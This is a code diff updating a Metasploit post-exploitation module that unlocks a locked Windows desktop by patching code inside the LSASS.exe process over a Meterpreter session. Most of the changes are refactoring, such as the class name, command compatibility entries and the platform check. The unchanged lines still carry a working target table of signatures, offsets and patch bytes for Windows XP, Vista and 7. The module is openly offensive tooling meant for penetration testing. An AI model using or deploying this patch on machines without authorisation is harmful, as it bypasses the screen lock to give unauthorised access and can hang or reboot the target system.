@@ -1,48 +1,55 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'metasm'
 
+class MetasploitModule < Msf::Post
 
-class Metasploit3 < Msf::Post
-
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'Windows Escalate Locked Desktop Unlocker',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Escalate Locked Desktop Unlocker',
+        'Description' => %q{
           This module unlocks a locked Windows desktop by patching
-        the respective code inside the LSASS.exe process. This
-        patching process can result in the target system hanging or
-        even rebooting, so be careful when using this module on
-        production systems.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        =>
-        [
-          'L4teral <l4teral[4t]gmail com>',  # Meterpreter script
+          the respective code inside the LSASS.exe process. This
+          patching process can result in the target system hanging or
+          even rebooting, so be careful when using this module on
+          production systems.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'L4teral <l4teral[4t]gmail com>', # Meterpreter script
           'Metlstorm'                        # Based on the winlockpwn tool released by Metlstorm: http://www.storm.net.nz/projects/16
         ],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_sys_config_sysinfo
+              stdapi_sys_process_attach
+              stdapi_sys_process_memory_read
+              stdapi_sys_process_memory_write
+            ]
+          }
+        }
+      )
+    )
 
     register_options([
       OptBool.new('REVERT', [false, "Enable this option to revert the in-memory patch and enable locking again", false])
-    ], self.class)
-
+    ])
   end
 
   def unsupported
-    print_error("This version of Meterpreter is not supported with this Script!")
+    print_error("This platform is not supported with this Script!")
     raise Rex::Script::Completed
   end
 
   def run
-
     revert = datastore['REVERT']
 
     targets = [
@@ -52,10 +59,10 @@ class Metasploit3 < Msf::Post
       { :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xb391, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xb44e, :os => /Windows Vista/ },
       { :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xacf6, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xadb3, :os => /Windows Vista/ },
       { :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xe881, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xe93e, :os => /Windows 7/ },
-      { :sig => "8bff558bec83ec50a1",       :sigoffset => 0x97d3, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x9878, :os => /Windows XP.*Service Pack 3 - spanish/ }
+      { :sig => "8bff558bec83ec50a1", :sigoffset => 0x97d3, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x9878, :os => /Windows XP.*Service Pack 3 - spanish/ }
     ]
 
-    unsupported if client.platform !~ /win32|win64/i
+    unsupported if client.platform != 'windows' || (client.arch != ARCH_X64 && client.arch != ARCH_X86)
     os = client.sys.config.sysinfo['OS']
 
     targets.each do |t|
@@ -94,5 +101,4 @@ class Metasploit3 < Msf::Post
 
     print_error("No working target found")
   end
-
 end
